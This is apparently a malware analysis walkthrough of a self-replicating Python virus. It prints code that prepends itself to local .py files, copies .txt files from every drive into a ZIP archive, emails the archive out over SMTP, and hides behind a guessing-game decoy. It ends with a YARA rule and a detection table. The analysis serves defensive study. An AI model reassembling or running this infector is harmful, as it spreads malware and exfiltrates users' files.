## 📖 Code Walkthrough & Line-by-Line Breakdown

This section breaks down how the prepending script mechanism reads its own source code, scans local directories, and injects itself into target `.py` files while preserving original file functionality.

---

### Phase 1: Self-Introspection & Payload Extraction

```python
# Open current executing file and extract code between delimiter markers
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

virus_area = False

for line in lines:
    if line == '### THE VIRUS STARTS HERE ###\n':
        virus_area = True
    if virus_area:
        code.append(line)
    if line == '### THE VIRUS ENDS HERE ###\n':
        break
```

- sys.argv[0]: References the file path of the currently executing script.
- Flag (virus_area): Acts as a toggle. When the parser encounters the comment ### THE VIRUS STARTS HERE ###, it flips virus_area to True.
- Array Append (code.append(line)): Reads and copies every line of code until it reaches ### THE VIRUS ENDS HERE ###, storing the extracted payload block into the code array in memory.

---

### Phase 2: Target File Discovery

```python
# Scan current working directory for Python scripts
python_scripts = glob.glob('*.py')
```

- glob.glob('*.py'): Searches the current directory for files matching the .py file extension and returns them as a list.

---

### Phase 3: Infection Check & Prepending Logic

```python
for script in python_scripts:
    with open(script, 'r') as f:
        script_code = f.readlines()

    infected = False

    # Check if target already contains the signature marker
    for line in script_code:
        if line == '### THE VIRUS STARTS HERE ###\n':
            infected = True
            break
```

- Preventing Re-Infection Loops: Before modifying a file, the script opens and scans each line of the target script for the marker ### THE VIRUS STARTS HERE ###.
- Infection Flag: If the signature is found, infected = True stops further inspection, leaving already modified files untouched.

```python
if not infected:
        final_code = []
        final_code.extend(code)         # Insert payload first
        final_code.extend('\n')        # Add line separator
        final_code.extend(script_code)  # Append target's original code

        with open(script, 'w') as f:
            f.writelines(final_code)
```

- Prepending Structure: If uninfected, a new buffer (final_code) is constructed:
    - Extracted code block (code) is placed at the top (beginning of file).
    - Original code (script_code) is appended directly after the injected code.
- File Overwrite: The target file is opened in write mode ('w'), replacing the original contents with the newly prepended combined code.

---

### Phase 4: Multi-Threaded Execution Architecture
```
# Concurrently launch infection, exfiltration, and decoy routines
T1 = threading.Thread(target=infection)
T1.start()
T2 = threading.Thread(target=malicious_code)
T2.start()
T3 = threading.Thread(target=mask)
T3.start()
```
- Parallel Execution: Uses Python's threading library to execute infection(), malicious_code(), and mask() simultaneously across three separate threads.
- Stealth & Evasion: Running the propagation and exfiltration logic in background threads (T1 and T2) prevents the process from blocking, allowing the user-facing decoy thread (T3) to run without noticeable latency.

### Phase 5: Drive Enumeration, Staging & Exfiltration (malicious_code())
```
# Query active Windows drive letters via low-level Bitmask
drives = []
bitmask = windll.kernel32.GetLogicalDrives()

for letter in string.ascii_uppercase:
    if bitmask & 1:
        drives.append(letter)
    bitmask >>= 1
```
- Drive Mapping: Uses ctypes to call GetLogicalDrives() from Windows kernel32.dll, using bitwise right-shift operations (>>= 1) to enumerate all mounted drives (e.g., C:\, D:\).

```
# Recursive directory traversal for file harvesting
for C in drives:
    src_dir = C + ":\\"
    for dirpath, dirnames, filenames in os.walk(src_dir):
        for x in filenames:
            if x.endswith(".txt"):
                # Copy targeted text files into staging folder (\tempvirus)
                file_path = os.path.join(dirpath, x)
                shutil.copy(file_path, dst_dir)

# Package staging folder into a ZIP archive
fileToSend = shutil.make_archive(access, 'zip', access)
```

- File System Traversal: os.walk() recursively scans all discovered directories to isolate files matching targeted extensions (.txt).
- Data Staging: Copies targeted files into a newly created staging directory (\tempvirus) and compresses the folder into a .zip archive using shutil.make_archive().

```
# Exfiltrate archive via SMTP protocol
smtp = smtplib.SMTP(Server, port)
smtp.login(UserName, Password)
smtp.sendmail(UserName, "email@example.com", msg.as_string())
smtp.close()
```

- Configuration Ingestion: Reads SMTP server credentials, port numbers, and authentication details from a local mail.txt file.
- Payload Transmission: Formats the ZIP archive into a Base64-encoded MIME attachment and transmits the data to a remote address over standard SMTP using smtplib.

### Phase 6: Decoy Application & Process Termination (mask())
```
# Interactive CLI game to distract the user
guess = int(input("Guess a number:- "))

# Abrupt process termination upon completion
current_system_pid = os.getpid()
ThisSystem = psutil.Process(current_system_pid)
ThisSystem.terminate()
```

- Social Engineering Mask: Runs an interactive number-guessing game in the foreground to keep the user engaged while background threads complete execution.
- Forced Termination: Retrieves the current process ID (os.getpid()) and invokes psutil.Process().terminate() to kill the entire Python process, immediately ending any active background activity once the decoy game concludes.

### Phase 7: Comprehensive Defensive Engineering & Detection
- Sample Detection Rule (YARA)
```
rule Detect_Python_MultiThreaded_Infector {
    meta:
        description = "Detects prepending Python infector with threading and exfiltration mechanics"
        author = "Security Analysis Lab"
        severity = "High"
    strings:
        $start_marker = "### THE VIRUS STARTS HERE ###"
        $end_marker   = "### THE VIRUS ENDS HERE ###"
        $self_read    = "sys.argv[0]"
        $drive_enum   = "GetLogicalDrives"
        $smtp         = "smtplib.SMTP"
    condition:
        all of ($start_marker, $end_marker,$self_read) or
        ($drive_enum and$smtp)
}
```

- Detection Matrix

| Attack Vector | Identified Behavior | Defensive Control / Mitigation |
| :--- | :--- | :--- |
| **Self-Inspection** | Reading `sys.argv[0]` to extract source code | **Heuristic Analysis:** Flag scripts attempting self-reading file handles combined with directory iteration. |
| **Prepending Injection** | Overwriting `.py` files with prepended payload | **File Integrity Monitoring (FIM):** Track SHA-256 hash changes across system and project dependencies. |
| **Multi-Threading** | Spawning parallel background execution threads | **Process Monitoring:** Alert on CLI scripts initiating background worker threads prior to user input. |
| **Drive Traversal** | Calling `GetLogicalDrives()` & broad `os.walk()` scans | **EDR Behavioral Rules:** Detect rapid, high-volume file read operations across local and mapped drives. |
| **Exfiltration** | Transmitting ZIP archives via SMTP | **DLP & Firewall:** Enforce egress filtering on SMTP ports (25, 465, 587) and monitor outbound MIME attachments. |
| **Static Markers** | Delimiter comments embedded in scripts | **YARA Signatures:** Match known string markers (`### THE VIRUS... ###`) during static file scans. |
